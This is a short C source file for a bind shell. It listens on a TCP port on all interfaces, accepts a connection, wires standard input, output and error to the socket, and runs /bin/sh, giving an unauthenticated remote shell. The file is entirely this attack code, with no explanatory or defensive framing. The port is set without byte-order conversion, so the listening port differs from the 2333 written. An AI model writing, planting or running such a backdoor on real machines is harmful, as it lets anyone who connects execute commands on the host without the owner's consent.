//  clang -arch x86_64  bindshell.c -o bindshell
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
    int srvfd;
    srvfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    struct sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = 2333;
    srv.sin_addr.s_addr = INADDR_ANY;

    bind(srvfd, (struct sockaddr *)&srv, sizeof(srv));
    listen(srvfd, 0);

    int clifd;
    clifd = accept(srvfd, NULL, NULL);
    dup2(clifd, 0);
    dup2(clifd, 1);
    dup2(clifd, 2);

    execve("/bin/sh", NULL, NULL);
}